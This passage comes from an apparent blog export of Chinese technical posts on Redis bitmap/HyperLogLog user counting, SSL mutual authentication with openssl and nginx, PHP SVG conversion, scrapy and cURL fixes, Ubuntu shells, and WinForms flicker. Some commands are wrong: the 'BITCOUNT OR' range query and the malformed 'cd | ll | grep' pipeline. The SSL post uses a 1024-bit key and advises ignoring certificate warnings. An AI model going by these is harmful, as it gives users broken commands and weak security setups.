<p>因为 bitmap 的每一位只占据 1bit 的空间 ，所以利用这个特性我们可以把每一天作为 key，value 为 1 亿用户的活跃度状态。假设一个用户一天内只要登录了一次就算活跃。活跃我们就记为 1，不活跃我们就记为 0 。把用户 Id 作为偏移量(offset)。这样我们一个 key 就可以存储 1 亿用户的活跃状态。</p>
<p>我们再来算下，这样一个位图结构的值对象占据多少空间。每一个位是 1bit，一亿用户就是一亿 bit 。8bit=1Byte</p>
<p>$100000000/8/1024/1024=11.92M$</p>
<p>我用测试工程往一个 key 里通过 lua 塞进了 1 亿个 bit，然后用 rdb tools 统计这个可以需要消耗 12M 的内存空间，这完全符合要求，而且 redis 可以集群部署来进行扩容存储。我们也可以用位图压缩算法对 bitmap 进行压缩存储，例如： WAH，EWAH，Roaring Bitmaps。</p>
<p>我们把每一天 1 亿用户的登录状态都用 bitmap 的形式存进了 redis，那要获取某一天 id 为 88000 的用户是否活跃，直接使用命令：</p>
<blockquote>
<p>GETBIT 2020-01-01 88000 [时间复杂度为 O(1)]</p>
</blockquote>
<p>如果要统计某一天的所有的活跃用户数，使用bitcount命令，bitcount 可以统计 1 的个数，也就是活跃用户数：</p>
<blockquote>
<p>BITCOUNT 2020-01-01 [时间复杂度为 O(N)]</p>
</blockquote>
<p>如果要统计某一段时间内的活跃用户数，需要用到 bitop 命令。这个命令提供四种位运算，AND(与)，(OR)或，XOR(亦或)，NOT(非)。我们可以对某一段时间内的所有 key 进行OR(或)操作，或操作出来的位图是 0 的就代表这段时间内一次都没有登录的用户。那只要我们求出 1 的个数就可以了。以下例子求出了 2020-01-01 到 2020-01-05 这段时间内的活跃用户数:</p>
<blockquote>
<p>BITCOUNT OR result 2020-01-01 2020-01-02 2020-01-03 2020-01-04 2020-01-05 [时间复杂度为 O(N)]</p>
</blockquote>
<p>从时间复杂度上说，无论是统计某一天，还是统计一段时间, 在实际测试中基本上都是秒出的，符合我们的预期。</p>
<p>bitmap 可以很好的满足一些需要记录大量而简单信息的场景，所占空间十分小，通常来说使用场景分 2 类：</p>
<ul>
<li><p>某一业务对象的横向扩展，key 为某一个业务对象的 id，比如记录某一个终端的功能开关，1 代表开，0 代表关。基本可以无限扩展，可以记录 2^32 个位信息。不过这种用法由于 key 上带有了业务对象的 id，导致了 key 的存储空间大于了 value 的存储空间，从空间使用角度上来看有一定的优化空间。</p>
</li>
<li><p>某一业务的纵向扩展，key 为某一个业务，把每一个业务对象的 id 作为偏移量记录到位上。这道面试题的例子就是用此法来进行解决。十分巧妙的利用了用户的 id 作为偏移量来找到相对应的值。当业务对象数量超过 2^32 时（约等于 42 亿），还可以分片存储。</p>
</li>
</ul>
<h3 id="方案二：HyperLogLog"><a href="#方案二：HyperLogLog" class="headerlink" title="方案二：HyperLogLog"></a>方案二：HyperLogLog</h3><p>redis 从 2.8.9 之后增加了 HyperLogLog 数据结构。这个数据结构，根据 redis 的官网介绍，这是一个概率数据结构，用来估算数据的基数。能通过牺牲准确率来减少内存空间的消耗。</p>
<p>我们先来看看 HyperLogLog 的方法：</p>
<p><strong>PFADD</strong> 添加一个元素，如果重复，只算作一个</p>
<p><strong>PFCOUNT</strong> 返回元素数量的近似值</p>
<p><strong>PFMERGE</strong> 将多个 HyperLogLog 合并为一个 HyperLogLog</p>
<p>这很好理解，是不是。那我们就来看看同样是存储一亿用户的活跃度，HyperLogLog 数据结构需要多少空间。是不是比 bitmap 更加省空间呢。</p>
<p>我通过测试工程往 HyperLogLog 里 PFADD 了一亿个元素，通过 rdb tools 工具统计了这个 key 只需要 14392 Bytes，也就是 14KB 的空间。bitmap 存储一亿需要 12M，而 HyperLogLog 只需要 14K 的空间。这是一个很惊人的结果。<br>接下来我又放了 1000w 数据，统计出来还是 14k 。也就是说，无论你放多少数据进去，都是 14K 。</p>
<p>查了文档，发现 HyperLogLog 是一种概率性数据结构，在标准误差 0.81%的前提下，能够统计 ${2}^{64}$ 个数据。所以 HyperLogLog 适合在比如统计日活月活此类的对精度要不不高的场景。</p>
<p>HyperLogLog 使用概率算法来统计集合的近似基数，而它算法的最本源则是<em>伯努利过程</em>。</p>
<blockquote>
<p><a href="https://baike.baidu.com/item/%E4%BC%AF%E5%8A%AA%E5%88%A9%E8%BF%87%E7%A8%8B/610420?fr=aladdin" target="_blank" rel="noopener">伯努利过程</a>：简单来说，伯努利过程就是一个抛硬币实验的过程。抛一枚正常硬币，落地可能是正面，也可能是反面，二者的概率都是 $\frac{1}{2}$ 。伯努利过程就是一直抛硬币，直到落地时出现正面位置，并记录下抛掷次数 k 。比如说，抛一次硬币就出现正面了，此时 k 为 1; 第一次抛硬币是反面，则继续抛，直到第三次才出现正面，此时 k 为 3 。 对于 n 次伯努利过程，我们会得到 n 个出现正面的投掷次数值 $k_1$, $k_2$ … $k_n$ , 其中这里的最大值是 $k_{max}$ 。根据一顿数学推导，我们可以得出一个结论：${2}^{k_{max}}$来作为 n 的估计值。也就是说你可以根据最大投掷次数近似的推算出进行了几次伯努利过程。</p>
</blockquote>
<p>虽然 HyperLogLog 数据类型不是精确统计,只适用于对精度要求不高的场景，而且这种类型无法得出每个用户的活跃度信息。</p>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>对于文章开头所提到的问题，用 <strong>Bitmap</strong> 和 <strong>HyperLogLog</strong> 都可以解决。</p>
<table>
<thead>
<tr>
<th align="left"></th>
<th align="left">Bitmap</th>
<th align="left">HyperLogLog</th>
</tr>
</thead>
<tbody><tr>
<td align="left">优点</td>
<td align="left">非常均衡的特性，精准统计，可以得到每个统计对象的状态，秒出</td>
<td align="left">可以统计夸张到无法想象的数量，并且占用小的夸张的内存</td>
</tr>
<tr>
<td align="left">缺点</td>
<td align="left">当你的统计对象数量十分十分巨大时，可能会占用到一点存储空间，但也可在接受范围内。也可以通过分片，或者压缩的额外手段去解决</td>
<td align="left">建立在牺牲准确率的基础上，而且无法得到每个统计对象的状态</td>
</tr>
</tbody></table>
]]></content>
      <categories>
        <category>数据库</category>
      </categories>
  </entry>
  <entry>
    <title>SSL双向认证</title>
    <url>/articles/SSL%E5%8F%8C%E5%90%91%E8%AE%A4%E8%AF%81/</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>有朋友最近遇到客户需求：他们出于安全考虑只能是从某一台电脑才能访问应用。以下是我所想到的几种实现方案思考：</p>
<ul>
<li><p>IP地址。 你所用的IP都是运营商自动随机分配的，基本上都是处在变化中的，要想固定IP，你需要支付高昂的网络费用购买专网服务保证IP不发生变化，且需要保证局域网内就你使用这个对外的IP地址。</p>
</li>
<li><p>客户端软件。提供配套的客户端软件与web应用实现通信，配合MAC地址唯一性，验证客户身份。web端QQ自动登录就是这么发现你本地登录了哪些QQ的，更多可以看我这篇文章<a href="/articles/QQ如何实现跨端通信的/">QQ如何实现跨端通信的</a>了解原理。</p>
</li>
<li><p>SSL双向认证。生成客户证书，只让持有证书的客户访问。安装证书和安装桌面客户端是一样的考验客户的电脑操作水平。</p>
</li>
</ul>
<p>当然，肯定还有其他更好的方案，欢迎大佬留言指点一二。  </p>
<p>本篇文章主要是记录一下我是如何实现SSL双向认证这个方案的。<em>ip方案没啥好说的，保证IP唯一即可。客户端软件方案我在<a href="/articles/QQ如何实现跨端通信的/">QQ如何实现跨端通信的</a>这篇文章有DEMO。</em></p>
<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><ul>
<li><p>SSL单向认证</p>
<p><img src="/articles/SSL双向认证/SSL%E5%8D%95%E5%90%91%E8%AE%A4%E8%AF%81.png" alt="SSL单向认证"></p>
</li>
</ul>
<ul>
<li><p>①客户端的浏览器向服务器传送客户端SSL协议的版本号，加密算法的种类，产生的随机数，以及其他服务器和客户端之间通讯所需要的各种信息。</p>
</li>
<li><p>②服务器向客户端传送SSL协议的版本号，加密算法的种类，随机数以及其他相关信息，同时服务器还将向客户端传送自己的证书。</p>
</li>
<li><p>③客户利用服务器传过来的信息验证服务器的合法性，服务器的合法性包括：证书是否过期，发行服务器证书的CA是否可靠，发行者证书的公钥能否正确解开服务器证书的”发行者的数字签名”，服务器证书上的域名是否和服务器的实际域名相匹配。如果合法性验证没有通过，通讯将断开;如果合法性验证通过，将继续进行第四步。</p>
</li>
<li><p>④用户端随机产生一个用于后面通讯的”对称密码”，然后用服务器的公钥(服务器的公钥从步骤②中的服务器的证书中获得)对其加密，然后将加密后的”预主密码”传给服务器。</p>
</li>
<li><p>⑤如果服务器要求客户的身份认证(在握手过程中为可选)，用户可以建立一个随机数然后对其进行数据签名，将这个含有签名的随机数和客户自己的证书以及加密过的”预主密码”一起传给服务器。</p>
</li>
<li><p>⑥如果服务器要求客户的身份认证，服务器必须检验客户证书和签名随机数的合法性，具体的合法性验证过程包括：客户的证书使用日期是否有效，为客户提供证书的CA是否可靠，发行CA 的公钥能否正确解开客户证书的发行CA的数字签名，检查客户的证书是否在证书废止列表(CRL)中。检验如果没有通过，通讯立刻中断;如果验证通过，服务器将用自己的私钥解开加密的”预主密码 “，然后执行一系列步骤来产生主通讯密码(客户端也将通过同样的方法产生相同的主通讯密码)。</p>
</li>
<li><p>⑦服务器和客户端用相同的主密码即”通话密码”，一个对称密钥用于SSL协议的安全数据通讯的加解密通讯。同时在SSL通讯过程中还要完成数据通讯的完整性，防止数据通讯中的任何变化。</p>
</li>
<li><p>⑧客户端向服务器端发出信息，指明后面的数据通讯将使用的步骤⑦中的主密码为对称密钥，同时通知服务器客户端的握手过程结束。</p>
</li>
<li><p>⑨服务器向客户端发出信息，指明后面的数据通讯将使用的步骤⑦中的主密码为对称密钥，同时通知客户端服务器端的握手过程结束。</p>
</li>
<li><p>⑩-SSL的握手部分结束，SSL安全通道的数据通讯开始，客户和服务器开始使用相同的对称密钥进行数据通讯，同时进行通讯完整性的检验。 </p>
</li>
<li><p>SSL双向认证</p>
</li>
</ul>
<p><img src="/articles/SSL双向认证/SSL%E5%8F%8C%E5%90%91%E8%AE%A4%E8%AF%81.png" alt="SSL双向认证"></p>
<p>① 浏览器发送一个连接请求给安全服务器。</p>
<p>② 服务器将自己的证书，以及同证书相关的信息发送给客户浏览器。</p>
<p>③ 客户浏览器检查服务器送过来的证书是否是由自己信赖的CA中心（如沃通CA）所签发的。如果是，就继续执行协议;如果不是，客户浏览器就给客户一个警告消息：警告客户这个证书不是可以信赖的，询问客户是否需要继续。</p>
<p>④ 接着客户浏览器比较证书里的消息，例如域名和公钥，与服务器刚刚发送的相关消息是否一致，如果是一致的，客户浏览器认可这个服务器的合法身份。</p>
<p>⑤ 服务器要求客户发送客户自己的证书。收到后，服务器验证客户的证书，如果没有通过验证，拒绝连接;如果通过验证，服务器获得用户的公钥。</p>
<p>⑥ 客户浏览器告诉服务器自己所能够支持的通讯对称密码方案。</p>
<p>⑦ 服务器从客户发送过来的密码方案中，选择一种加密程度最高的密码方案，用客户的公钥加过密后通知浏览器。</p>
<p>⑧ 浏览器针对这个密码方案，选择一个通话密钥，接着用服务器的公钥加过密后发送给服务器。</p>
<p>⑨ 服务器接收到浏览器送过来的消息，用自己的私钥解密，获得通话密钥。</p>
<p>⑩ 服务器、浏览器接下来的通讯都是用对称密码方案，对称密钥是加过密的。</p>
<p>双向认证则是需要服务端与客户端提供身份认证，只能是服务端允许的客户能去访问，安全性相对于要高一些。 </p>
<h2 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h2><p>网上有很多实现方法，个人觉得这篇文章说的最详细：<a href="https://www.cnblogs.com/dyllove98/p/3157370.html" target="_blank" rel="noopener">传送门</a></p>
<p>因为我域名下面申请过一个https,所以下面是我省去生成服务器端证书直接生成客户端证书的步骤：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">// 生成服务器crt, 用来验证client证书的, ca.key就是https证书那个</span><br><span class="line">openssl req -new -x509 -days 3650 -key ca.key -out ca.crt </span><br><span class="line"></span><br><span class="line">// 生成客户端证书</span><br><span class="line">openssl genrsa -des3 -out client.key 1024</span><br><span class="line"></span><br><span class="line">openssl req -new -key client.key -out client.csr</span><br><span class="line"></span><br><span class="line">openssl ca -policy policy_anything -<span class="keyword">in</span> client.csr -cert ca.crt -keyfile ca.key -out client.crt -days 3650</span><br><span class="line"></span><br><span class="line">// 生成浏览器证书安装文件</span><br><span class="line">openssl pkcs12 -<span class="built_in">export</span> -inkey client.key -<span class="keyword">in</span> client.crt -out client.pfx</span><br></pre></td></tr></table></figure>

<p>上面代码可以在linux上面执行，也可以在windows上面执行。linux不说了，windows用户主要安装了apache的可以在它bin目录下找到 openssl.exe文件。</p>
<p>生成好了就开始使用了</p>
<ul>
<li>服务端</li>
</ul>
<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment"># server</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">listen</span> <span class="number">443</span> ssl;</span><br><span class="line"></span><br><span class="line"><span class="attribute">ssl_certificate</span>  /etc/pki/ca_linvo/server/server.crt;       <span class="comment">#server公钥</span></span><br><span class="line"><span class="attribute">ssl_certificate_key</span>  /etc/pki/ca_linvo/server/server.key;   <span class="comment">#server私钥</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">ssl_client_certificate</span>   /etc/pki/ca_linvo/root/ca.crt;     <span class="comment"># 根级证书公钥，用于验证各个二级client</span></span><br><span class="line"><span class="attribute">ssl_verify_client</span> <span class="literal">on</span>;                                       <span class="comment"># 开启客户端ssl校验</span></span><br></pre></td></tr></table></figure>

<ul>
<li>客户端</li>
</ul>
<p>双击 <strong>client.pfx</strong> 安装证书，安装时会提示输入生成证书时设置的密码。安装成功后，重启浏览器输入网址访问，浏览器可能会提示你选择证书，选择刚才安装的那个证书即可。 此时有些浏览器会提示用户该证书不受信任，地址不安全之类，这是因为我们的server证书是我们自己颁发的，而非真正的权威CA机构颁布，忽略它既可。当然你也可以像我一样去 <strong>x云</strong> 申请一个免费server证书用着。 </p>
<ul>
<li>测试 </li>
</ul>
<p><img src="/articles/SSL双向认证/demo.png" alt></p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>SSL单向验证过程中，客户端会验证自己访问的服务器端，服务器端对客户端不做验证。如果服务器端验证客户端，则需要开启服务器端验证，这就是双向验证。 </p>
<style>.posts-expand .post-body img{margin:0 auto; max-height:100vh;}</style>]]></content>
      <categories>
        <category>服务器运维</category>
      </categories>
  </entry>
  <entry>
    <title>SVG to PNG</title>
    <url>/articles/SVG%20to%20PNG/</url>
    <content><![CDATA[<p><strong>Installation</strong></p>
<blockquote>
<p>$ composer require meyfa/php-svg</p>
</blockquote>
<p><strong>Getting Started</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">require</span> <span class="string">'../vendor/autoload.php'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">SVG</span>\<span class="title">SVGImage</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">SVG</span>\<span class="title">Nodes</span>\<span class="title">Shapes</span>\<span class="title">SVGRect</span>;</span><br><span class="line"></span><br><span class="line">$svg = file_get_contents(<span class="string">"d:/1.svg"</span>);</span><br><span class="line"></span><br><span class="line">$svg = str_replace(<span class="string">'fill="#2c2c2c"'</span>,<span class="string">'fill="#e21010"'</span>,$svg);</span><br><span class="line"></span><br><span class="line">$image = SVGImage::fromString($svg);</span><br><span class="line"></span><br><span class="line">$rasterImage = $image-&gt;toRasterImage(<span class="number">200</span>, <span class="number">200</span>);</span><br><span class="line"></span><br><span class="line">header(<span class="string">'Content-Type: image/png'</span>);</span><br><span class="line"></span><br><span class="line">imagepng($rasterImage,<span class="string">'d:/1.png'</span>);</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>PHP</category>
      </categories>
  </entry>
  <entry>
    <title>bash：scrapy：command not found</title>
    <url>/articles/bash-%20scrapy-%20command%20not%20found/</url>
    <content><![CDATA[<p><strong>一、场景</strong></p>
<p>执行 pip install scrapy 后，安装成功且执行 import scrapy 成功</p>
<p><strong>二、问题</strong></p>
<p>在shell中执行 scrapy 返回 bash: scrapy: command not found</p>
<p><strong>三、解决办法</strong></p>
<p>（1）进入 Python 的主目录，如cd /usr/local/python3.6/bin，查找 scrapy 项</p>
<p>（2）检查 cd /usr/bin/ | ll | grep scrapy，查看是否存在</p>
<p>（3）不存在则执行 ln -s /usr/local/bin/scrapy /usr/bin/scrapy</p>
<p>（4）回到shell，执行 scrapy version，成功</p>
]]></content>
      <categories>
        <category>Python</category>
      </categories>
  </entry>
  <entry>
    <title>cURL error 60：SSL certificate problem</title>
    <url>/articles/cURL%20error%2060-%20SSL%20certificate%20problem/</url>
    <content><![CDATA[<p><strong>问题描述:</strong></p>
<p>php在curl的时候报此错误：</p>
<p>cURL error 60: SSL certificate problem: unable to get local issuer certificate (see <a href="http://curl.haxx.se/libcurl/c/libcurl-errors.html" target="_blank" rel="noopener">http://curl.haxx.se/libcurl/c/libcurl-errors.html</a>)</p>
<p>根据报错后面提示的地址查询60错误：</p>
<p>CURLE_SSL_CACERT (60)<br>Peer certificate cannot be authenticated with known CA certificates.</p>
<p><strong>解决方法:</strong></p>
<p>关于“SSL证书问题：无法获取本地颁发者证书”错误。显然，这适用于发送CURL请求的系统（并且没有接收请求的服务器）</p>
<p>1）从 <a href="https://curl.haxx.se/ca/cacert.pem" target="_blank" rel="noopener">https://curl.haxx.se/ca/cacert.pem</a> 下载最新的cacert.pem</p>
<p>2）将以下行添加到php.ini  <code>curl.cainfo={放证书的目录}/cacert.pem</code></p>
<p>3）默认情况下，FastCGI进程将每隔300秒解析新文件（如果需要，您可以通过添加几个文件来更改频率）</p>
]]></content>
      <categories>
        <category>PHP</category>
      </categories>
  </entry>
  <entry>
    <title>Ubuntu切换默认sh为bash或者dash</title>
    <url>/articles/Ubuntu%E5%88%87%E6%8D%A2%E9%BB%98%E8%AE%A4sh%E4%B8%BAbash%E6%88%96%E8%80%85dash/</url>
    <content><![CDATA[<h4 id="bash与dash"><a href="#bash与dash" class="headerlink" title="bash与dash"></a>bash与dash</h4><p>从Ubuntu 6.10开始，默认使用dash(theDebian Almquist Shell)而不是bash(the GNUBourne-Again Shell).</p>
<p>但Login Shell还是bash. 原因是dash更快、更高效，而且它符合POSIX规范。Ubuntu在启动的时候会运行很多shell脚本，使用dash可以加快启动速度。</p>
<h5 id="什么是bash-？"><a href="#什么是bash-？" class="headerlink" title="什么是bash ？"></a>什么是bash ？</h5><p>Bash(GNU Bourne-Again Shell)是许多<a href="https://so.csdn.net/so/search/s.do?q=linux" target="_blank" rel="noopener">Linux</a>平台的内定Shell，事实上，还有许多传统UNIX上用的Shell，像tcsh、csh、ash、bsh、ksh等等，Shell Script大致都类同，当您学会一种Shell以后，其它的Shell会很快就上手，大多数的时候，一个Shell Script通常可以在很多种Shell上使用</p>
<h5 id="什么是dash-？"><a href="#什么是dash-？" class="headerlink" title="什么是dash ？"></a>什么是dash ？</h5><p>dash is the standard command interpreter for the system. The current</p>
<p>version of dash is in the process of being changed to conform with the</p>
<p>POSIX 1003.2 and 1003.2a specifications for the shell.</p>
<h4 id="切换bash和dash"><a href="#切换bash和dash" class="headerlink" title="切换bash和dash"></a>切换bash和dash</h4><h5 id="查看与使用"><a href="#查看与使用" class="headerlink" title="查看与使用"></a>查看与使用</h5><p>先用命令ls -l /bin/sh看看</p>
<blockquote>
<p>/bin/sh -&gt; dash</p>
</blockquote>
<p><img src="/articles/Ubuntu切换默认sh为bash或者dash/20160806150221504.png" alt="result"></p>
<p>我们会发现Ubuntu默认采用的是 dash</p>
<h5 id="切换sh为bash"><a href="#切换sh为bash" class="headerlink" title="切换sh为bash"></a>切换sh为bash</h5><p>如果要修改默认的sh，可以采用命令</p>
<blockquote>
<p>sudo dpkg-reconfigure dash</p>
</blockquote>
<p><img src="/articles/Ubuntu切换默认sh为bash或者dash/20160806150302989.png" alt="result"> </p>
<p>然后选择否</p>
<p><img src="/articles/Ubuntu切换默认sh为bash或者dash/20160806150333114.png" alt="result"> </p>
<p>成功后再执行</p>
<blockquote>
<p>ll /bin/sh</p>
</blockquote>
<p>结果是： /bin/sh -&gt; bash</p>
<p><img src="/articles/Ubuntu切换默认sh为bash或者dash/20160806150405619.png" alt="result"> </p>
<p>修改成功！</p>
<h5 id="切换sh为dash"><a href="#切换sh为dash" class="headerlink" title="切换sh为dash"></a>切换sh为dash</h5><p>当然我们也可以使用</p>
<blockquote>
<p>sudo dpkg-reconfigure dash</p>
</blockquote>
<p>把sh修改回去</p>
]]></content>
      <categories>
        <category>服务器运维</category>
      </categories>
  </entry>
  <entry>
    <title>Winform MDI窗体切换不闪烁的解决办法（测试通过）</title>
    <url>/articles/Winform%20MDI%E7%AA%97%E4%BD%93%E5%88%87%E6%8D%A2%E4%B8%8D%E9%97%AA%E7%83%81%E7%9A%84%E8%A7%A3%E5%86%B3%E5%8A%9E%E6%B3%95%EF%BC%88%E6%B5%8B%E8%AF%95%E9%80%9A%E8%BF%87%EF%BC%89/</url>
    <content><![CDATA[<p>MDI窗体不闪烁方法测试通过：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//.net 4.0用OptimizedDoubleBuffer</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">this</span>.SetStyle(ControlStyles.OptimizedDoubleBuffer | ControlStyles.UserPaint |  ControlStyles.AllPaintingInWmPaint, <span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">this</span>.UpdateStyles();</span><br></pre></td></tr></table></figure>

<p>真正有效的方法：在最上层窗体加上</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> override CreateParams CreateParams &#123;</span><br><span class="line">    get &#123;</span><br><span class="line">        CreateParams cp = base.CreateParams;</span><br><span class="line">        cp.ExStyle |= <span class="number">0x02000000</span>; <span class="comment">/* Turn on WS_EX_COMPOSITED */</span></span><br><span class="line">        <span class="keyword">return</span>(cp);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在下层的窗体和自定义控件加上</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> override CreateParams CreateParams</span><br><span class="line">&#123;</span><br><span class="line">    get</span><br><span class="line">    &#123;</span><br><span class="line">        CreateParams cp = base.CreateParams;</span><br><span class="line">        cp.Style &amp;= ~<span class="number">0x02000000</span>; <span class="comment">/* Turn off WS_CLIPCHILDREN */</span></span><br><span class="line">        <span class="keyword">return</span>(cp);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>注意：如果加错地方或人品不好，某些时候可能会造成控件绘制略微不正常。</p>
<p><strong>如果人品爆发的话，貌似在下层窗体直接加 cp.Style &amp;= ~0x02000000 就行，不需要在上层窗体加 cp.ExStyle |= 0x02000000;</strong></p>
<p><strong>注意下层窗体代码在ListBox或者ListView的Anchor设有Right，且窗体BackColor与控件背景不同的时候，可能会发现控件初始化显示不正常。需要做一下MdiParent.Refresh或者取消Right;</strong></p>
<p>引用MSDN中对CreateParams的说明：</p>
<p>在你开发的重载控件中不要重写这个属性，通过这个属性控制控件的某些风格。只有在你封装Windows控件或者想实现某些WinForm没有提供的风格（比如Layered Window）控制的时候再使用这个属性。更多信息请参照MSDN上对CreateWindow方法和CreateWindowEx方法的参数CREATESTRUCT结构体的文档注释。</p>
<p>简述为何CreateParams能够实现这样高级的样式控制，因为从CreateWindow和CreateWindowEx的名字就可以看出，CreateParam是传递给这俩个方法的参数，而这两个方法又是在窗体创建的时候调用的。所以，CreateParam才能够实现如此强大的样式控制。</p>
<p>节点更新要使用 BeginUpdate 和 EndUpdate</p>
<p>这一对操作对于需要批量操作更新控件的情景有比较好的效果，比如初始化时批量添加了大量节点。坏处就在于不能即时更新。所以，对于频繁的更新节点并希望立即反映到界面的情况不适用。如果使用并且没有禁掉清除界面消息的话，则控件看起来就会不停的闪烁，而且以白底为主，内容几乎不可见（这个视频繁程度而定）。因为界面更新都在EndUpdate处完成，操作太多导致EndUpdate阻塞时间过长，且清空在先，更新在后，导致界面看起来长时间处于空白状态。</p>
<p>某些情况下可以使用禁止背景更新</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> override <span class="keyword">void</span> <span class="title">WndProc</span><span class="params">( ref Message m )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> ( m.Msg == <span class="number">0x0014</span> )</span><br><span class="line">        <span class="keyword">return</span>;      <span class="comment">/* 禁掉清除背景消息 */</span></span><br><span class="line">    base.WndProc( ref m );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">ListViewNF</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">/* 开启双缓冲 */</span></span><br><span class="line">    <span class="keyword">this</span>.SetStyle( ControlStyles.OptimizedDoubleBuffer | ControlStyles.AllPaintingInWmPaint, <span class="keyword">true</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Enable the OnNotifyMessage event so we get a chance to filter out */</span></span><br><span class="line">    <span class="comment">/* Windows messages before they get to the form's WndProc */</span></span><br><span class="line">    <span class="keyword">this</span>.SetStyle( ControlStyles.EnableNotifyMessage, <span class="keyword">true</span> );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">protected</span> override <span class="keyword">void</span> <span class="title">OnNotifyMessage</span><span class="params">( Message m )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">/* Filter out the WM_ERASEBKGND message */</span></span><br><span class="line">    <span class="keyword">if</span> ( m.Msg != <span class="number">0x14</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        base.OnNotifyMessage( m );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 采 用LockWindowUpdate API</span></span><br><span class="line"></span><br><span class="line">[DllImport( <span class="string">"user32.dll"</span> )]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> extern bool <span class="title">LockWindowUpdate</span><span class="params">( IntPtr hWndLock )</span></span>;</span><br><span class="line"></span><br><span class="line">LockWindowUpdate( panelContainer.Handle );</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Clear Panel */</span></span><br><span class="line">panelContainer.Controls.Clear();</span><br><span class="line"></span><br><span class="line"><span class="comment">/* my temporary TextBox */</span></span><br><span class="line">TextBox myT;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> ( <span class="keyword">int</span> lauf = <span class="number">0</span>; lauf &lt; <span class="number">200</span>; lauf++ )</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">/* Create New TextBox */</span></span><br><span class="line">    myT = <span class="keyword">new</span> TextBox();</span><br><span class="line">    <span class="comment">/* Add TextBox to the Panel */</span></span><br><span class="line">    panelContainer.Controls.Add( myT );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* redraw the window */</span></span><br><span class="line">LockWindowUpdate( IntPtr.Zero );</span><br><span class="line"></span><br><span class="line">frmChild1.Hide();   <span class="comment">/* 隐藏当前显示的子窗体2 3 */</span></span><br><span class="line">LockWindowUpdate( <span class="keyword">this</span>.Handle );  <span class="comment">/* 锁定父窗体4 */</span></span><br><span class="line">frmChild2.Show();    <span class="comment">/* 显示窗体等其他需要再显示前做的事5 */</span></span><br><span class="line">LockWindowUpdate( IntPtr.Zero ); <span class="comment">/* 解锁父窗体6 */</span></span><br><span class="line">RedrawWindow( <span class="keyword">this</span>.Handle, IntPtr.Zero, IntPtr.Zero, RDW_ERASE | RDW_INVALIDATE | RDW_ALLCHILDREN );</span><br><span class="line"><span class="comment">/* (0x04 | 0x01 | 0x80)立即强制重绘父窗体及其所有子窗体效果好转，但人眼还能看到一些花屏现象，仍不能一次全部完整显示。 */</span></span><br></pre></td></tr></table></figure>

<p>使用Windows API中的SendMessage函数：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* 拦截控件重绘 */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DrawingControl</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    [DllImport( <span class="string">"user32.dll"</span> )]</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> extern <span class="keyword">int</span> <span class="title">SendMessage</span><span class="params">( IntPtr hWnd, Int32 wMsg, bool wParam, Int32 lParam )</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">const</span> <span class="keyword">int</span> WM_SETREDRAW = <span class="number">11</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">SuspendDrawing</span><span class="params">( Control parent )</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        SendMessage( parent.Handle, WM_SETREDRAW, <span class="keyword">false</span>, <span class="number">0</span> );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">ResumeDrawing</span><span class="params">( Control parent )</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        SendMessage( parent.Handle, WM_SETREDRAW, <span class="keyword">true</span>, <span class="number">0</span> );</span><br><span class="line">        parent.Refresh();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span 